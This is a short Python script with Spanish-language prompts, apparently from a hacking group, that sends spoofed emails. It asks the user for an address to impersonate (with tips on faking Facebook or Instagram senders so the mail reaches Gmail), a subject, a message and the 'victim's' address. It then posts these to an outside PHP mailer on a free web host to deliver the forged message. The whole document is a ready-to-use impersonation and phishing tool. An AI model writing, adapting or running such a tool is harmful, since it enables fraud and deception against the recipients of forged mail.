import requests
# pip install pyfiglet
import pyfiglet

from colorama import init, Fore, Back, Style
init()

ascii_banner = pyfiglet.figlet_format("EMAIL ERROR")
print(ascii_banner)
print('Suplantacion de E-MAIL\n')
print(Fore.RED+'NOTA: Para que llegue a Gmail en correo a suplantar en vez de usar\nFacebook@facebook.com\nsolo ponen la palabra Facebook o lo mismo con Instagram y otras redes\nSi no es GMAIL pueden omitan esta nota.\n')
print(Fore.GREEN+'')



micorreo = (input('Correo a suplantar : '))
name = (input('Tu nombre : '))
sub = (input('Asunto : '))
msj = (input('Mensaje : '))
to = (input('Correo de la victima : '))
resp = requests.post('https://streamuy.000webhostapp.com/email.php', {
  'ajax': '1',
  'from': '{}'.format(micorreo),
  'name': '{}'.format(name),
  'sub': '{}'.format(sub),
  'msg': '{}'.format(msj),
  'to': '{}'.format(to),  
})
print(Fore.CYAN+'\nEnviando Correo')
print('\n')
print(Back.BLACK+Style.BRIGHT+'\n✔️Correo Enviado✔️\n\n')

print(Back.BLACK+Style.BRIGHT+'FB: https://www.facebook.com/hackinguruguay')
print(Back.BLACK+Style.BRIGHT+'Script creado por : FATAL ERROR ')


